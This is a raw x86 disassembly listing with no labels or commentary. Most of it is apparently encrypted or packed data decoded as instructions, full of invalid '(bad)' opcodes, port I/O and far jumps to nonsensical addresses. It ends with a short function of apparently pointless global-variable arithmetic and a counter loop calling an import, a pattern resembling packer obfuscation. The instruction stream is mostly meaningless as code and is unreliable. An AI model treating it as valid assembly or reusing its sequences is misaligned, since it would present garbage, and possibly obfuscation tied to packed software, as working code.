  40fae0:	sub    eax,0x4187b4ca
  40fae5:	sti    
  40fae6:	call   0xf7bf:0x6dfbf738
  40faed:	cmp    ch,BYTE PTR [ecx-0x30ef2f1]
  40faf3:	mov    dh,0x9d
  40faf5:	dec    edi
  40faf6:	cmp    eax,0x9e96deab
  40fafb:	jbe    0x40faaa
  40fafd:	push   DWORD PTR cs:[esi+0xb5f40a3]
  40fb04:	sub    eax,0xf375399e
  40fb09:	sbb    ebx,DWORD PTR [edi]
  40fb0b:	(bad)  
  40fb0c:	fidiv  DWORD PTR [ecx]
  40fb0e:	xchg   esp,eax
  40fb0f:	enter  0xed35,0xd4
  40fb13:	cs pop ds
  40fb15:	sbb    eax,DWORD PTR [ebx-0x10ca9b5]
  40fb1b:	pushf  
  40fb1c:	jae    0x40fb06
  40fb1e:	fbld   TBYTE PTR [esi]
  40fb20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb21:	sbb    al,0xa
  40fb23:	dec    esi
  40fb24:	jge    0x40fb2b
  40fb26:	xor    eax,edx
  40fb28:	ret    
  40fb29:	int    0x66
  40fb2b:	inc    esp
  40fb2c:	mov    ebp,0x446628cc
  40fb31:	lods   al,BYTE PTR ds:[esi]
  40fb32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb33:	jp     0x40fb43
  40fb35:	adc    DWORD PTR [edx-0x33c3241a],ebp
  40fb3b:	retf   0x54b
  40fb3e:	sbb    eax,0x9e6618a2
  40fb43:	pop    ecx
  40fb44:	jo     0x40fafe
  40fb46:	leave  
  40fb47:	cmp    cl,BYTE PTR [eax+0x7c]
  40fb4a:	hlt    
  40fb4b:	adc    bl,BYTE PTR [edi]
  40fb4d:	sbb    eax,0xce21e3a0
  40fb52:	mov    ?,WORD PTR [eax-0x1c]
  40fb55:	loop   0x40fb36
  40fb57:	xchg   esi,eax
  40fb58:	add    esi,0xed44cfb7
  40fb5e:	fstp   QWORD PTR [edx+0x2a]
  40fb61:	cmp    ah,dh
  40fb63:	out    dx,al
  40fb64:	leave  
  40fb65:	dec    edx
  40fb66:	add    DWORD PTR [edx+0x4c],edx
  40fb69:	xchg   DWORD PTR [ebx+0x5c0810b2],edi
  40fb6f:	xchg   edi,eax
  40fb70:	scas   al,BYTE PTR es:[edi]
  40fb71:	lds    ebp,FWORD PTR [esi-0x16736610]
  40fb77:	cdq    
  40fb78:	mov    ebx,0xf271f7ac
  40fb7d:	aaa    
  40fb7e:	dec    edx
  40fb7f:	mov    dl,0x14
  40fb81:	pop    ecx
  40fb82:	xchg   edi,eax
  40fb83:	cdq    
  40fb84:	int    0x8f
  40fb86:	adc    eax,0x836a1293
  40fb8b:	mov    al,0xaa
  40fb8d:	sahf   
  40fb8e:	test   BYTE PTR [ecx-0x4e],ch
  40fb91:	push   ecx
  40fb92:	mov    dl,0x3f
  40fb94:	dec    ecx
  40fb95:	enter  0xb377,0x94
  40fb99:	les    ecx,FWORD PTR [esi+0x3b53c3af]
  40fb9f:	xchg   ecx,eax
  40fba0:	and    edx,DWORD PTR [eax-0x68679f1]
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x5
  40fbc9:	adc    DWORD PTR [esp+ecx*8-0x30],0x7c7e7eb6
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fb68
  40fbd5:	pop    edx
  40fbd6:	jne    0x40fbc9
  40fbd8:	popf   
  40fbd9:	mov    edi,0xb818ef29
  40fbde:	in     eax,0x2
  40fbe0:	sbb    BYTE PTR [edx+0x45],ch
  40fbe3:	test   DWORD PTR [edx+ecx*8],edi
  40fbe6:	mov    ebp,0xc739d6e4
  40fbeb:	xor    esp,DWORD PTR [eax]
  40fbed:	or     eax,0xe4f67d93
  40fbf2:	(bad)  
  40fbf3:	cmp    bl,dh
  40fbf5:	jle    0x40fbb6
  40fbf7:	das    
  40fbf8:	rcl    BYTE PTR [edx-0x7f80e818],0x96
  40fbff:	je     0x40fbc5
  40fc01:	and    eax,0x4e959d6b
  40fc06:	das    
  40fc07:	mov    ds:0x53cf049,eax
  40fc0c:	leave  
  40fc0d:	fcmovne st,st(4)
  40fc0f:	mov    ah,0x34
  40fc11:	cld    
  40fc12:	jns    0x40fc0f
  40fc14:	dec    edi
  40fc15:	mov    ch,0x78
  40fc17:	add    DWORD PTR ds:0x62b4b488,ebp
  40fc1d:	js     0x40fc5e
  40fc1f:	shr    DWORD PTR [ecx-0x3f3f27e4],1
  40fc25:	xlat   BYTE PTR ds:[ebx]
  40fc26:	add    BYTE PTR [eax],bl
  40fc28:	pop    ds
  40fc29:	xchg   edi,eax
  40fc2a:	mov    ch,0x1c
  40fc2c:	iret   
  40fc2d:	xor    al,0xeb
  40fc2f:	aam    0x7
  40fc31:	xchg   ebp,eax
  40fc32:	test   dh,ah
  40fc34:	xor    al,0x6b
  40fc36:	push   0x9ea1db64
  40fc3b:	daa    
  40fc3c:	push   ds
  40fc3d:	addr16 pop es
  40fc3f:	mov    ecx,0x86ebb95a
  40fc44:	push   cs
  40fc45:	aad    0xdf
  40fc47:	inc    edx
  40fc48:	in     eax,dx
  40fc49:	mov    bl,0x90
  40fc4b:	div    DWORD PTR [esi-0x48d45224]
  40fc51:	cmp    al,0xba
  40fc53:	leave  
  40fc54:	or     ebp,0x440e716e
  40fc5a:	dec    DWORD PTR ds:0x9646ff07
  40fc60:	lock sbb DWORD PTR [edx+esi*1-0x63ab1e68],esp
  40fc68:	daa    
  40fc69:	arpl   WORD PTR [edx-0xd],ax
  40fc6c:	jno    0x40fce8
  40fc6e:	cmp    al,0xa9
  40fc70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc71:	addr16 push esi
  40fc73:	lds    esi,FWORD PTR [esi+0x42a9de1b]
  40fc79:	add    ah,0xe5
  40fc7c:	cmp    al,0x3a
  40fc7e:	into   
  40fc7f:	xchg   esi,eax
  40fc80:	out    0x1a,al
  40fc82:	mov    ds:0x4ff9edd2,al
  40fc87:	ins    BYTE PTR es:[edi],dx
  40fc88:	mov    ds:0x63ef15dd,eax
  40fc8d:	cmp    eax,0x63b41d35
  40fc92:	sub    al,0x5f
  40fc94:	std    
  40fc95:	mov    ds:0xb7b498a0,al
  40fc9a:	cmp    esi,edi
  40fc9c:	sub    BYTE PTR [eax-0x5729669],bh
  40fca2:	cdq    
  40fca3:	test   DWORD PTR [edx+0x66],0x41576cff
  40fcaa:	cmp    eax,0x9c29fe1b
  40fcaf:	rcr    DWORD PTR [eax-0x46e8a5f7],0x86
  40fcb6:	iret   
  40fcb7:	or     eax,0xc0d33775
  40fcbc:	sahf   
  40fcbd:	(bad)  
  40fcbe:	fldpi  
  40fcc0:	jmp    0x5679:0xb31079e2
  40fcc7:	jl     0x40fd11
  40fcc9:	pop    ecx
  40fcca:	xor    BYTE PTR [eax+0x3c50a757],dl
  40fcd0:	cmp    dl,BYTE PTR [edx+0x55e1494f]
  40fcd6:	out    0x95,al
  40fcd8:	mov    eax,ds:0x10716e85
  40fcdd:	int3   
  40fcde:	push   edx
  40fcdf:	adc    ebx,edx
  40fce1:	stos   BYTE PTR es:[edi],al
  40fce2:	test   al,0x67
  40fce4:	sub    DWORD PTR [esi+0x6e41b049],0xb25598f3
  40fcee:	push   es
  40fcef:	fs dec ecx
  40fcf1:	inc    ecx
  40fcf2:	cwde   
  40fcf3:	dec    ebp
  40fcf4:	xor    al,0x73
  40fcf6:	jne    0x40fd46
  40fcf8:	jle    0x40fcf4
  40fcfa:	iret   
  40fcfb:	or     DWORD PTR [esi+0x39],ebp
  40fcfe:	shl    DWORD PTR [ebp-0x14],0x20
  40fd02:	add    edx,edi
  40fd04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd05:	xor    BYTE PTR [esi],bl
  40fd07:	cmp    eax,0xad644150
  40fd0c:	mov    cl,0x82
  40fd0e:	push   ecx
  40fd0f:	daa    
  40fd10:	sti    
  40fd11:	(bad)  [ebx-0x5f]
  40fd14:	mov    bl,bh
  40fd16:	into   
  40fd17:	aad    0x65
  40fd19:	push   edi
  40fd1a:	lea    edx,es:[edi+0x483d2bc5]
  40fd21:	mov    cl,0x7a
  40fd23:	retf   0xe756
  40fd26:	mov    edi,0x6b3ea4b4
  40fd2b:	mov    ds:0xdc0fede0,al
  40fd30:	pusha  
  40fd31:	xchg   DWORD PTR [ebp+0xc],esp
  40fd34:	sbb    DWORD PTR [ebx],0xa730c540
  40fd3a:	cmp    eax,0xca309303
  40fd3f:	test   eax,0x23312a8b
  40fd44:	sbb    BYTE PTR [esi-0x4],al
  40fd47:	jp     0x40fd65
  40fd49:	scas   eax,DWORD PTR es:[edi]
  40fd4a:	mov    al,ds:0x7d00a274
  40fd4f:	mov    al,0x87
  40fd51:	fucomp st(0)
  40fd53:	fdiv   QWORD PTR [edx-0x2d4a395a]
  40fd59:	jno    0x40fdae
  40fd5b:	scas   eax,DWORD PTR es:[edi]
  40fd5c:	into   
  40fd5d:	sub    ebp,0x39
  40fd60:	popf   
  40fd61:	mov    ebp,0x9930baa3
  40fd66:	outs   dx,BYTE PTR ds:[esi]
  40fd67:	pushf  
  40fd68:	ds enter 0x282a,0xc6
  40fd6d:	mov    WORD PTR [ebp+0x764909fe],?
  40fd73:	arpl   sp,si
  40fd75:	ins    DWORD PTR es:[edi],dx
  40fd76:	iret   
  40fd77:	jno    0x40fd81
  40fd79:	mov    cl,0xd4
  40fd7b:	shl    ah,0xb0
  40fd7e:	jmp    0x4cf14635
  40fd83:	not    bh
  40fd85:	nop
  40fd86:	cs inc edi
  40fd88:	sub    BYTE PTR [esi],0x61
  40fd8b:	adc    edi,DWORD PTR [edx+0x7114237b]
  40fd91:	int3   
  40fd92:	mov    ecx,0xe8c32b03
  40fd97:	mov    ecx,0x1ea25237
  40fd9c:	cmp    al,ch
  40fd9e:	sbb    BYTE PTR ds:0x535af6b1,0x7e
  40fda5:	push   ss
  40fda6:	mov    al,ds:0xad397f06
  40fdab:	push   ebx
  40fdac:	mov    edx,0xaad9e09a
  40fdb1:	out    dx,al
  40fdb2:	pop    ss
  40fdb3:	lea    ecx,[ecx]
  40fdb5:	push   eax
  40fdb6:	icebp  
  40fdb7:	fwait
  40fdb8:	in     al,dx
  40fdb9:	fcmovu st,st(4)
  40fdbb:	push   eax
  40fdbc:	or     DWORD PTR [esi],edx
  40fdbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdbf:	gs jns 0x40fdce
  40fdc2:	adc    esi,DWORD PTR [esi]
  40fdc4:	mov    cl,0x43
  40fdc6:	(bad)  
  40fdc7:	jecxz  0x40fdcd
  40fdc9:	aas    
  40fdca:	xchg   DWORD PTR [edi+edx*4+0x605cfa50],esp
  40fdd1:	icebp  
  40fdd2:	bound  edi,QWORD PTR [ebp-0x25]
  40fdd5:	jg     0x40fd80
  40fdd7:	cld    
  40fdd8:	adc    BYTE PTR [eax-0x8290e20],ch
  40fdde:	rol    BYTE PTR [edx],cl
  40fde0:	dec    edx
  40fde1:	fwait
  40fde2:	loope  0x40fd73
  40fde4:	dec    ebx
  40fde5:	pusha  
  40fde6:	es and al,0x1c
  40fde9:	cli    
  40fdea:	jg     0x40fdd5
  40fdec:	inc    eax
  40fded:	mov    eax,ds:0x39ce266b
  40fdf2:	add    BYTE PTR [edi],bl
  40fdf4:	dec    ebx
  40fdf5:	and    DWORD PTR [edx+0x11],edx
  40fdf8:	cmp    dh,BYTE PTR [esi]
  40fdfa:	iret   
  40fdfb:	and    al,BYTE PTR [eax]
  40fdfd:	ds (bad) 
  40fdff:	dec    ebp
  40fe00:	add    eax,0x3adfeeb9
  40fe05:	mov    ds:0xfc8165ec,eax
  40fe0a:	es mov esp,0x837959fc
  40fe10:	pop    ebx
  40fe11:	add    DWORD PTR [ebp+0x15],ebx
  40fe14:	add    ebx,esp
  40fe16:	adc    eax,0x4baf8f8a
  40fe1b:	cli    
  40fe1c:	dec    eax
  40fe1d:	xchg   ebp,eax
  40fe1e:	or     BYTE PTR [ebp-0x39d16197],ah
  40fe24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe25:	mov    ah,BYTE PTR [edx]
  40fe27:	and    ah,al
  40fe29:	mov    DWORD PTR [ecx+ebx*1+0x34],eax
  40fe2d:	pop    DWORD PTR [ebp+ecx*1+0x5d]
  40fe31:	push   ebp
  40fe32:	push   ebx
  40fe33:	test   al,0x6e
  40fe35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe36:	mov    cl,0x49
  40fe38:	arpl   WORD PTR [edx],ax
  40fe3a:	push   ss
  40fe3b:	cmp    DWORD PTR [edi],ecx
  40fe3d:	test   DWORD PTR [eax],esp
  40fe3f:	leave  
  40fe40:	in     al,dx
  40fe41:	dec    esp
  40fe42:	das    
  40fe43:	pop    ss
  40fe44:	mov    ebx,esp
  40fe46:	adc    ebp,DWORD PTR [edx]
  40fe48:	icebp  
  40fe49:	jecxz  0x40fea5
  40fe4b:	push   ds
  40fe4c:	jp     0x40fe41
  40fe4e:	push   ecx
  40fe4f:	push   ss
  40fe50:	lahf   
  40fe51:	xor    eax,ecx
  40fe53:	cdq    
  40fe54:	add    bh,ch
  40fe56:	data16 cmp bl,0x7c
  40fe5a:	mov    ecx,0x362e978
  40fe5f:	shr    BYTE PTR [ecx-0x8],cl
  40fe62:	dec    ebp
  40fe63:	push   esi
  40fe64:	push   ecx
  40fe65:	sub    eax,0xa8591faa
  40fe6a:	or     bl,dh
  40fe6c:	sbb    DWORD PTR [esi+0x4bafdbea],edi
  40fe72:	sti    
  40fe73:	pop    es
  40fe74:	mov    eax,0xb953d400
  40fe79:	lods   eax,DWORD PTR ds:[esi]
  40fe7a:	ja     0x40feda
  40fe7c:	pushf  
  40fe7d:	sbb    dl,BYTE PTR [esi+esi*8]
  40fe80:	mov    dh,0x25
  40fe82:	sub    eax,0x7cbd874d
  40fe87:	mov    ebx,0x7bb69a6
  40fe8c:	loop   0x40fef9
  40fe8e:	mov    DWORD PTR ds:[edx-0x2c78c448],0x8f796668
  40fe99:	test   DWORD PTR [edx-0xbd6ae2f],esi
  40fe9f:	sbb    al,0xfd
  40fea1:	sub    esp,0xfffffff4
  40fea4:	jns    0x40fed1
  40fea6:	dec    edi
  40fea7:	cmp    DWORD PTR [edi],ebx
  40fea9:	(bad)  
  40feaa:	xor    al,0x81
  40feac:	fnsave ds:0x9cc02bde
  40feb2:	and    eax,0xf8c557d1
  40feb7:	xor    BYTE PTR [esi],dl
  40feb9:	and    BYTE PTR [ecx-0x7f],0x1a
  40febd:	add    eax,edx
  40febf:	and    al,BYTE PTR [edx+0x28]
  40fec2:	daa    
  40fec3:	dec    ebx
  40fec4:	out    0x2d,al
  40fec6:	outs   dx,DWORD PTR ds:[esi]
  40fec7:	inc    edi
  40fec8:	sbb    dl,0x1b
  40fecb:	mov    cl,0x2b
  40fecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fece:	sbb    DWORD PTR [esp+ebp*2+0x51],esi
  40fed2:	xchg   edi,eax
  40fed3:	adc    eax,0x458b132c
  40fed8:	or     al,0x33
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x4f294346
  40fef3:	mov    WORD PTR [edi-0x22],es
  40fef6:	mov    ch,0x7e
  40fef8:	jle    0x40ff76
  40fefa:	jge    0x40ff7a
  40fefc:	jle    0x40ff12
  40fefe:	jecxz  0x40ff6f
  40ff00:	jne    0x40ff12
  40ff02:	mov    ds:0x3346ce9e,al
  40ff07:	inc    edi
  40ff08:	xchg   ebp,eax
  40ff09:	inc    ebx
  40ff0a:	add    BYTE PTR [edi+0x16],0x9a
  40ff0e:	data16 and BYTE PTR [ecx],bh
  40ff11:	jecxz  0x40ff0c
  40ff13:	mov    edx,?
  40ff15:	xor    dl,BYTE PTR [ebx+0x5e]
  40ff18:	inc    eax
  40ff19:	adc    bh,BYTE PTR [ecx+0x76]
  40ff1c:	mov    WORD PTR [esi+0x584ddd71],es
  40ff22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff23:	(bad)  
  40ff24:	push   edx
  40ff25:	fdiv   st(0),st
  40ff27:	ja     0x40ffa6
  40ff29:	mov    al,0x59
  40ff2b:	cwde   
  40ff2c:	outs   dx,DWORD PTR ds:[esi]
  40ff2d:	xor    eax,edx
  40ff2f:	pop    ss
  40ff30:	cmp    dh,BYTE PTR [esi+ebp*8]
  40ff33:	cmp    esi,DWORD PTR [eax+0x43ec455e]
  40ff39:	fmul   DWORD PTR [edx]
  40ff3b:	cmp    ebx,DWORD PTR [eax+0x7b07d024]
  40ff41:	aaa    
  40ff42:	xor    BYTE PTR [edi-0x7ad4252f],bh
  40ff48:	mov    eax,DWORD PTR [esi-0x5737bbe5]
  40ff4e:	sub    al,BYTE PTR [edx+0xa50e1cc]
  40ff54:	mov    ds,WORD PTR [edi-0x5f]
  40ff57:	leave  
  40ff58:	or     eax,0xa46e6073
  40ff5d:	or     BYTE PTR [eax-0x5a],bl
  40ff60:	rol    DWORD PTR [ebx],1
  40ff62:	dec    ecx
  40ff63:	adc    BYTE PTR [edi+0x7cb1ac9a],al
  40ff69:	adc    BYTE PTR [ebp-0x52],bh
  40ff6c:	sahf   
  40ff6d:	sub    bl,BYTE PTR [esi+0x6a]
  40ff70:	pop    ecx
  40ff71:	ins    BYTE PTR es:[edi],dx
  40ff72:	shl    edi,1
  40ff74:	jmp    0x40ff88
  40ff76:	int    0xf7
  40ff78:	push   cs
  40ff79:	jmp    0x95ae13ae
  40ff7e:	jno    0x40ff34
  40ff80:	inc    esp
  40ff81:	cmc    
  40ff82:	cmp    eax,0xaf5cc033
  40ff87:	or     DWORD PTR [ecx+0x71],ecx
  40ff8a:	mov    al,0x8d
  40ff8c:	fld    DWORD PTR [edi-0x46]
  40ff8f:	in     eax,0x1b
  40ff91:	and    al,0x37
  40ff93:	adc    esi,esi
  40ff95:	mov    al,0x31
  40ff97:	std    
  40ff98:	out    dx,al
  40ff99:	ins    DWORD PTR es:[edi],dx
  40ff9a:	dec    ecx
  40ff9b:	push   edi
  40ff9c:	cld    
  40ff9d:	push   0x8f74e49e
  40ffa2:	or     eax,0xffffffb0
  40ffa5:	jne    0x40ffc6
  40ffa7:	xchg   esp,ebp
  40ffa9:	push   ebp
  40ffaa:	mov    WORD PTR [ebx-0x3e6d9baf],es
  40ffb0:	jo     0x40ffc1
  40ffb2:	cs out 0xae,eax
  40ffb5:	int    0xc8
  40ffb7:	or     al,0x13
  40ffb9:	dec    edi
  40ffba:	std    
  40ffbb:	mul    edx
  40ffbd:	pop    ebx
  40ffbe:	mov    ds:0x21585b90,al
  40ffc3:	sbb    DWORD PTR [edx-0x2bd75c39],ecx
  40ffc9:	or     ah,BYTE PTR [edx+0x64]
  40ffcc:	outs   dx,DWORD PTR ds:[esi]
  40ffcd:	push   eax
  40ffce:	sbb    ecx,DWORD PTR [edi-0x33]
  40ffd1:	mov    al,ds:0x567fed5c
  40ffd6:	lds    ebp,FWORD PTR [ebx]
  40ffd8:	test   ebx,0xd69f2d16
  40ffde:	ins    DWORD PTR es:[edi],dx
  40ffdf:	mov    ds:0x437b6229,eax
  40ffe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffe5:	mov    cs,WORD PTR [edx-0x530311c2]
  40ffeb:	cli    
  40ffec:	in     eax,dx
  40ffed:	adc    al,0x5c
  40ffef:	pusha  
  40fff0:	popa   
  40fff1:	mov    al,ds:0xf18222d1
  40fff7:	mov    ebx,0x7c2ec9dd
  40fffc:	add    BYTE PTR [edi+ebp*2-0x71601387],0x9b
  410004:	std    
  410005:	mov    ds:0xb448641d,al
  41000a:	shl    DWORD PTR [eax],cl
  41000c:	push   edx
  41000d:	jno    0x410037
  41000f:	pop    edi
  410010:	cmp    eax,0x57a2884f
  410015:	in     eax,0x4
  410017:	inc    edx
  410018:	push   eax
  410019:	sbb    BYTE PTR ds:0xe1fdba43,ah
  41001f:	pusha  
  410020:	sti    
  410021:	loope  0x40ffc9
  410023:	dec    esp
  410024:	push   esi
  410025:	push   esi
  410026:	adc    ebx,esp
  410028:	mov    al,0xbf
  41002a:	mov    ebp,0xf9232fd9
  41002f:	pushf  
  410030:	mov    bl,BYTE PTR [ebx-0x2560d592]
  410036:	cld    
  410037:	sbb    BYTE PTR [edx-0x6c8f443d],bl
  41003d:	cmp    al,0x2d
  41003f:	jle    0x40ffd8
  410041:	mov    edi,0x25d49bf3
  410046:	pusha  
  410047:	sub    dh,bl
  410049:	push   0xffffffb3
  41004b:	cmp    BYTE PTR [edi+edi*8+0xf17549b],0x39
  410053:	fs adc eax,ebx
  410056:	imul   ebp,DWORD PTR [ebp+ebx*1+0x5ea416c5],0x75
  41005e:	retf   
  41005f:	push   ecx
  410060:	rcl    BYTE PTR [ebx+0x4c],0x57
  410064:	ror    DWORD PTR [ebp+edx*2+0x14e33cd1],0xf6
  41006c:	sti    
  41006d:	xchg   edx,eax
  41006e:	ins    BYTE PTR es:[edi],dx
  41006f:	shl    BYTE PTR [edi+0x0],0x2c
  410073:	sbb    DWORD PTR [eax],edx
  410075:	out    0x77,eax
  410077:	inc    ebp
  410078:	imul   ebp,DWORD PTR [eax-0x7d],0xffffffc9
  41007c:	mov    eax,0x80b77602
  410081:	and    eax,0xd0d76fc9
  410086:	push   0x7d
  410088:	psubsw mm5,QWORD PTR [ebx-0x7155cf69]
  41008f:	jl     0x41007d
  410091:	jo     0x4100d9
  410093:	ja     0x4100e6
  410095:	mov    ebx,0x714155ea
  41009a:	in     al,0x7b
  41009c:	sub    eax,0x900bac49
  4100a1:	xchg   esp,eax
  4100a2:	xor    esp,DWORD PTR [edi-0x4c]
  4100a5:	repz aam 0xa
  4100a8:	inc    esp
  4100a9:	adc    eax,0x1e06b231
  4100ae:	xchg   ebp,edi
  4100b0:	sbb    DWORD PTR [edi-0x38a82792],esp
  4100b6:	push   0xffffffa5
  4100b8:	mov    al,ds:0x8dcaf92f
  4100bd:	out    0x39,eax
  4100bf:	in     eax,0x8a
  4100c1:	cld    
  4100c2:	mov    edx,0x2f24b98
  4100c7:	dec    edx
  4100c8:	cs mov esi,0xa53bcd71
  4100ce:	jge    0x41008c
  4100d0:	lds    eax,FWORD PTR [edi+0x3f]
  4100d3:	fistp  DWORD PTR [esi-0x3a814e3d]
  4100d9:	jecxz  0x410145
  4100db:	rcr    DWORD PTR [esi+0x72],cl
  4100de:	push   ds
  4100df:	push   eax
  4100e0:	inc    esp
  4100e1:	inc    ebx
  4100e2:	xchg   edx,eax
  4100e3:	mov    DWORD PTR [eax-0x4269bf27],ecx
  4100e9:	xchg   dh,bl
  4100eb:	pop    edi
  4100ec:	sar    BYTE PTR [eax-0x61184b06],cl
  4100f2:	in     eax,0xb8
  4100f4:	mov    ah,0xae
  4100f6:	mov    bh,0xe5
  4100f8:	mov    DWORD PTR [edi+0x7006524c],ecx
  4100fe:	fwait
  4100ff:	out    0xe1,eax
  410101:	sub    eax,0xfefa5c71
  410106:	xchg   ebx,eax
  410107:	cmp    al,0xb6
  410109:	cmp    al,0x50
  41010b:	out    0x87,eax
  41010d:	xchg   edx,eax
  41010e:	inc    esi
  41010f:	and    ecx,DWORD PTR [edi+esi*1-0x4e372aae]
  410116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410117:	into   
  410118:	mov    DWORD PTR [ebp+0x2de8b7f],ecx
  41011e:	retf   0xce1
  410121:	ja     0x41018b
  410123:	mov    cl,0x86
  410125:	lods   eax,DWORD PTR ds:[esi]
  410126:	jnp    0x4100d8
  410128:	mov    cl,0x6d
  41012a:	mov    esi,0x9bf3390e
  41012f:	pop    ebp
  410130:	mov    edi,0x5c346440
  410135:	xchg   DWORD PTR [ecx],edx
  410137:	sbb    DWORD PTR [ebx-0x5613a66c],esi
  41013d:	jp     0x4100f1
  41013f:	test   BYTE PTR [edi-0x68],ch
  410142:	mov    ds:0x69ac994,eax
  410147:	mov    ah,0x49
  410149:	retf   
  41014a:	cmp    ebp,ebp
  41014c:	fsubr  DWORD PTR [esi+ebx*8-0x1aa93358]
  410153:	sbb    eax,0x52629b7e
  410158:	sbb    al,0xb5
  41015a:	ins    DWORD PTR es:[edi],dx
  41015b:	xlat   BYTE PTR ds:[ebx]
  41015c:	jl     0x410157
  41015e:	icebp  
  41015f:	inc    esp
  410160:	shr    BYTE PTR cs:[edx],1
  410163:	xor    DWORD PTR [ebx+0x26],ebp
  410166:	or     DWORD PTR [edi-0x64],ecx
  410169:	dec    eax
  41016a:	jge    0x41011c
  41016c:	mov    dl,0x63
  41016e:	push   ebp
  41016f:	imul   edi,ecx,0xf3be94a
  410175:	mov    cl,0xbe
  410177:	push   edi
  410178:	adc    ch,BYTE PTR [eax+ebx*1-0x74]
  41017c:	pusha  
  41017d:	pop    ss
  41017e:	xchg   ecx,eax
  41017f:	and    eax,esi
  410181:	ss out 0xaa,al
  410184:	dec    ebx
  410185:	jle    0x410187
  410187:	push   es
  410188:	adc    esi,DWORD PTR [eax+0x6e3bb6c]
  41018e:	mov    eax,0x69e9f3d0
  410193:	pusha  
  410194:	std    
  410195:	and    DWORD PTR [edi],0xe56c470e
  41019b:	and    bl,BYTE PTR [ebx+ebx*4]
  41019e:	das    
  41019f:	ss int3 
  4101a1:	ds mov bh,0xcf
  4101a4:	jle    0x410198
  4101a6:	mov    cl,0xe5
  4101a8:	mov    esp,0x18fc7492
  4101ad:	hlt    
  4101ae:	push   eax
  4101af:	fimul  WORD PTR ds:0x57775a5b
  4101b5:	(bad)  
  4101b7:	jbe    0x410153
  4101b9:	loope  0x4101d4
  4101bb:	daa    
  4101bc:	dec    BYTE PTR [ebx]
  4101be:	pop    ss
  4101bf:	mov    gs,WORD PTR [edx]
  4101c1:	(bad)  
  4101c2:	dec    esp
  4101c3:	ja     0x4101f0
  4101c5:	adc    DWORD PTR [esi],0xffffffd1
  4101c8:	add    DWORD PTR [esi],esp
  4101ca:	rol    DWORD PTR [ebx],0x27
  4101cd:	ror    DWORD PTR [ebp-0x5f],cl
  4101d0:	(bad)  [eax+0x234ccacb]
  4101d6:	and    al,BYTE PTR ds:0x7f6d587b
  4101dc:	enter  0x3ef5,0x3f
  4101e0:	xlat   BYTE PTR ds:[ebx]
  4101e1:	out    dx,eax
  4101e2:	(bad)  
  4101e3:	in     al,dx
  4101e4:	in     al,0x52
  4101e6:	jbe    0x4101ce
  4101e8:	(bad)  
  4101e9:	rcl    DWORD PTR [esi+0x1332b63f],cl
  4101ef:	jmp    0x30a68035
  4101f4:	pop    edi
  4101f5:	sub    dh,BYTE PTR [eax-0x47]
  4101f8:	dec    DWORD PTR [edx+0x2cf54dc1]
  4101fe:	adc    eax,0x4d8bf1f7
  410203:	adc    BYTE PTR [ebx],ah
  410205:	enter  0xc981,0x8f
  410209:	sbb    eax,0xc18b8116
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43369f
  41021e:	adc    DWORD PTR ds:0x4336d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43360b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43372b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4336df
  41026b:	or     DWORD PTR ds:0x4336d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4336ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4336ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4336ab,ecx
  410291:	cmp    DWORD PTR ds:0x4336ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4336ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4336ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4336ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4336ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433603
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4336e7,0x43369f
